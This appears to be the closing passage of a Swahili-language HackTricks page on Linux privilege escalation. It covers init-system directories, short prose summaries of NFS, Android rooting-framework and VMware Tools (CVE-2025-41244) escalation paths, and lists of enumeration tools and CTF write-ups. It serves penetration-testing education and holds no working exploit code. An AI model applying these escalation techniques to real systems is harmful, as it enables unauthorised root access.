Kumbukumbu `/etc/init.d` ni mahali pa **scripts** za System V init (SysVinit), **mfumo wa jadi wa usimamizi wa huduma za Linux**. Unajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kuendeshwa moja kwa moja au kupitia symbolic links zinazopatikana ndani ya `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusiana na **Upstart**, **usimamizi wa huduma** mpya zaidi ulioletwa na Ubuntu, ukitumia configuration files kwa majukumu ya usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, SysVinit scripts bado zinatumika pamoja na Upstart configurations kutokana na compatibility layer ndani ya Upstart.

**systemd** hujitokeza kama initialization na service manager ya kisasa, ikitoa features za hali ya juu kama on-demand daemon starting, automount management, na system state snapshots. Hupanga files ndani ya `/usr/lib/systemd/` kwa distribution packages na `/etc/systemd/system/` kwa mabadiliko ya administrator, hivyo kurahisisha mchakato wa system administration.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kawaida hu-hook syscall ili kufichua privileged kernel functionality kwa userspace manager. Weak manager authentication (k.m. signature checks based on FD-order au poor password schemes) inaweza kuruhusu local app kujifanya manager na kupandisha hadi root kwenye devices ambazo tayari zime-rooted. Jifunze zaidi na exploitation details hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa binary path kutoka kwa process command lines na kuitekeleza kwa -v ndani ya privileged context. Permissive patterns (k.m. kutumia \S) zinaweza kulinganisha attacker-staged listeners kwenye writable locations (k.m. /tmp/httpd), na hivyo kusababisha execution kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone generalized pattern inayotumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Hesabu vulns za kernel katika ins linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
